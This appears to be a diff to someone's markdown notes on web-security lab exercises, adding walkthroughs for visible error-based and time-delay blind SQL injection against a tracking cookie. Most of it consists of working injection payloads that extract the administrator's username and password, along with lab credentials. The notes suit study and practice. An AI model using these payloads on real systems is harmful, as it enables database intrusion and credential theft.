@@ -706,14 +706,14 @@ no error also ⚠️⚠️
 
 so how to make sure if really there is user call ``administrator`` :
 
-```
+```url
 0iLsW0UwGLuOfA5J' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||'--    error  appear because 1/0
 0iLsW0UwGLuOfA5J' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||'--    no error 
 ```
 
 now try to know if there is user call ``administrator`` with same way 
 
-```
+```url
 TrackingId=Gpf75xlv9ccLL8ZV' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator') ||'--
 ```
 
@@ -723,14 +723,14 @@ but if there is no user called ``administrator`` the ``SELECT CASE`` will not ex
 
 now if we try fake suer ``plaplapla``
 
-```
+```url
 TrackingId=Gpf75xlv9ccLL8ZV' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='plaplapla') ||'--
 ```
 no error appear so user not exist
 
 now we want to konw length of passowrd:
 
-```
+```url
 TrackingId=Gpf75xlv9ccLL8ZV' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)=1) ||'--
 ```
 send to intruder and select ``1`` and put value form ``1 to 30`` and when error appear that will be the length
@@ -741,7 +741,7 @@ so passowrd length is **``20``**
 
 now brute force it :
 
-```
+```url
 TrackingId=Gpf75xlv9ccLL8ZV' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and substr(password,1,1)='a')||'--
 ```
 
@@ -759,6 +759,153 @@ y0x9p0p2ci2q1iundrxq
 
  
 </details>
+
+
+
+
+
+
+
+
+
+<details>
+	<summary>Lab: Visible error-based SQL injection  (visible errors)</summary>
+
+
+> ###  This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+> #### The database contains a different table called ``users``, with columns called ``username`` and ``password``. To solve the lab, find a way to leak the password for the ``administrator`` user, then log in to their account.
+
+---
+
+
+```url 
+XGb1lTKF70BvkHkM'                 error appear
+XGb1lTKF70BvkHkM'--               error disappear      so it is vulnerable 
+```
+
+```url
+TrackingId=E4OUmE1Kd6YYqUU2' and CAST((SELECT 1) AS int)--
+TrackingId=E4OUmE1Kd6YYqUU2' and 1 ==> (int) not (boolean)
+```
+
+![image](https://github.com/user-attachments/assets/c4fa4f22-4984-4cc3-a7de-6b41cd188579)
+
+
+```url
+TrackingId=E4OUmE1Kd6YYqUU2' and 1=CAST((SELECT 1) AS int)--   no errors
+TrackingId=E4OUmE1Kd6YYqUU2' and 1=1
+TrackingId=E4OUmE1Kd6YYqUU2' and True
+```
+
+now exploit
+
+```
+TrackingId=E4OUmE1Kd6YYqUU2' and 1=CAST((SELECT username FROM users) AS int)--
+```
+
+![image](https://github.com/user-attachments/assets/28b17321-de6a-417c-959c-31579dac836b)
+
+
+> error because the request is too long so we clear tracking id
+
+```
+TrackingId=' and 1=CAST((SELECT username FROM users) AS int)--
+```
+
+![image](https://github.com/user-attachments/assets/d12ac037-ac94-4a24-a532-b88dd0cf9c4c)
+
+now try to appear first row as error but has name of first user
+
+```
+' and 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+![image](https://github.com/user-attachments/assets/e1006871-fea9-49c0-a530-bcd979c739ad)
+
+it work so first user is ``administrator``
+
+now appear first password as error
+
+```
+' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
+```
+
+![image](https://github.com/user-attachments/assets/ddcdd86d-847b-47cc-b3aa-b7b767588680)
+
+```
+administrator : cuqjexnaphj1h9gz3b6y
+```
+
+
+ 
+</details>
+
+
+
+
+
+
+
+
+
+
+
+<details>
+	<summary>Lab: Blind SQL injection with time delays</summary>
+
+> ###  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
+
+---
+
+```url
+TrackingId=1Pe7nqjCl5ZZt9q7' ||(SELECT pg_sleep(10))--'
+```
+
+
+ 
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
